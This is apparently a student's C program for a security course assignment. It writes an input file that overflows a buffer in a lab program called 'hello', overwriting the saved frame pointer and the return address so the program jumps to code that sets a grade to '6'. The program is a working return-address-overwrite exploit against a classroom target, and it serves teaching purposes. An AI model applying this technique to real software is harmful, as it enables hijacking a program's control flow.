/*---------------- ASPRIDIS NIKOLAOS ------- csd5178 ---------- createdata6.c ------------- 2023-2024 -------------------------------------*/

/* The following program creates a text file, called "data6", that contains
 * some ascii characters. If that text file is given as input to program
 * called "hello", it will change number 3 of the final output to number 6.
 * In other words, textfile called data6, when given as input to hello program, changes the
 * return address of readString function to the instruction that initialises
 * variable grade with character 6 (grade = '6'; //line 38, function main). */


#include <stdio.h>

int main(void) {
	FILE *fptr;
	int i;	

	fptr = fopen("data6", "w");
	if(!fptr) {
		fprintf(stderr, "ERROR: fopen() did not work properly!\nFile did not open -/- was not created successfully\nExit code -1!\n");
		return -1;
	}else {
		printf("file opened -/- was created successfully!\n");
	}
	
	/* writes "Nikos" (with '\0' included) into the first 6 positions of buf */
	fputc(78, fptr);
	fputc(105, fptr);
	fputc(107, fptr);
	fputc(111, fptr);
	fputc(115, fptr);
	fputc(0, fptr);

	/* fills the rest of the memory positions that belong to buf array*/
	for(i=0; i<42; i++)
		fputc(0, fptr);
	
	/* overwrites c with 0 (c = 0) */
	for(i=0; i<4; i++)
		fputc(0, fptr);
	
	/* overwrites i with 55 */	
	fputc(55, fptr);

	/* fills empty bytes with 0 */		
	for(i=0; i<9; i++) 
		fputc(0, fptr);

	/* overwrites old ebp with 0 */
	for(i=0; i<4; i++)
		fputc(0, fptr);

	/* overwrites return address ---> this is going to make function readString return to line no. 38 , with instruction : 'grade = '6';' */
	fputc(142, fptr);
	fputc(158, fptr);
	fputc(4, fptr);
	fputc(8, fptr);

	/* overwrites pointer s with its original value */
	fputc(224, fptr);
	fputc(66, fptr);
	fputc(14, fptr);
	fputc(8, fptr);
	

	fclose(fptr);

	return 0;
}



